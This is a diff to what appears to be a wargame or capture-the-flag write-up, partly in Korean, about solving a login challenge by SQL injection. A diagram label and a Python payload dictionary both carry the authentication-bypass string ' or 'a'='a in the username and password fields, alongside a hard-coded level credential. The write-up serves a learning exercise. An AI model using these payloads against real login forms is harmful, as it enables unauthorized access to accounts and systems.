@@ -20,7 +20,7 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5;
         }
-        step0 -> step1[label="username=' or 'a'='a&password=' or 'a'='a",arrowhead="normal"];
+        step0 -> step1[label="post_data: {username=' or 'a'='a&password=' or 'a'='a}",arrowhead="normal"];
         step3 -> step2[label="@solve",arrowhead="normal"];
     }
 
@@ -29,8 +29,8 @@
 Source Analysis
 ================================================================================================================
 
-- Target: Login 
-- Hint: Condition 
+- POST 로그인 페이지 취약점
+- MySQL, Or String Injection
 
 .. code-block:: html
 
@@ -43,7 +43,7 @@ Source Analysis
 
 |
 
-or injection
+or String injection
 ================================================================================================================
 
 .. code-block:: python
@@ -57,8 +57,6 @@ or injection
         "level2login":"easylevelsareeasy_%21"
     }
 
-    # ' or 1=1
-    # ' or 'a'='a
     payload = {
         "username": "' or 'a'='a",
         "password": "' or 'a'='a",
